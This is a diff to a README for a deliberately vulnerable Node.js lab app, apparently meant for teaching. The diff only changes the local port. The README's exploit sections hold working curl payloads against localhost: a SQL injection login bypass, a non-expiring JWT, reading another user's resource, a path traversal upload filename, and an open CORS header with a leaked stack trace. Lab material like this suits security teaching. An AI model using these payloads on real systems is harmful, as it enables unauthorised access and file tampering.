@@ -23,7 +23,7 @@ real, working vulnerabilities and later compare them against the hardened
 cd v1-inseguro
 npm install
 npm run seed     # creates data/v1-inseguro.db, applies schema.sql, inserts test users
-npm start         # listens on http://localhost:3000
+npm start         # listens on http://localhost:43171
 ```
 
 Seeded users (plaintext passwords, see vulnerability #2):
@@ -77,7 +77,7 @@ spliced directly into the query string.
 
 Exploit — auth bypass without knowing any password:
 ```bash
-curl -s -X POST http://localhost:3000/api/auth/login \
+curl -s -X POST http://localhost:43171/api/auth/login \
   -H "Content-Type: application/json" \
   -d '{"username":"'"'"' OR '"'"'1'"'"'='"'"'1'"'"' -- ","password":"anything"}'
 ```
@@ -104,7 +104,7 @@ that are valid forever.
 
 Exploit — decode the token payload and confirm there is no `exp` claim:
 ```bash
-TOKEN=$(curl -s -X POST http://localhost:3000/api/auth/login -H "Content-Type: application/json" \
+TOKEN=$(curl -s -X POST http://localhost:43171/api/auth/login -H "Content-Type: application/json" \
   -d '{"username":"alice","password":"alice123"}' | node -e "let d='';process.stdin.on('data',c=>d+=c);process.stdin.on('end',()=>console.log(JSON.parse(d).token))")
 echo $TOKEN | cut -d. -f2 | base64 -d
 # -> {"id":1,"username":"alice","iat":...}   <- no "exp" field, token never expires
@@ -119,10 +119,10 @@ in the URL.
 
 Exploit — alice reads bob's private resource using her own token:
 ```bash
-curl -s -X POST http://localhost:3000/api/auth/login -H "Content-Type: application/json" \
+curl -s -X POST http://localhost:43171/api/auth/login -H "Content-Type: application/json" \
   -d '{"username":"alice","password":"alice123"}'
 # -> grab "token" from the response, then:
-curl -s http://localhost:3000/api/resources/2 -H "Authorization: Bearer <alice_token>"
+curl -s http://localhost:43171/api/resources/2 -H "Authorization: Bearer <alice_token>"
 # -> returns bob's resource (id=2, user_id=2), even though alice's id is 1
 ```
 
@@ -142,7 +142,7 @@ traverses out of `src/uploads/`.
 
 Exploit — write a file outside the uploads directory:
 ```bash
-curl -s -X POST http://localhost:3000/api/resources/1/upload \
+curl -s -X POST http://localhost:43171/api/resources/1/upload \
   -H "Authorization: Bearer <alice_token>" \
   -F "file=@payload.txt;filename=../../traversal-evil.txt"
 ```
@@ -159,7 +159,7 @@ above the intended `src/uploads/`), not inside the uploads folder.
 
 Exploit — confirm the open CORS header and the leaked stack trace on error:
 ```bash
-curl -s -i -X POST http://localhost:3000/api/auth/register -H "Content-Type: application/json" \
+curl -s -i -X POST http://localhost:43171/api/auth/register -H "Content-Type: application/json" \
   -H "Origin: https://evil.example.com" -d '{"username":"alice","password":"x"}'
 # -> HTTP 200s show "Access-Control-Allow-Origin: *" regardless of Origin sent
 # -> registering an existing username returns the full SqliteError stack trace
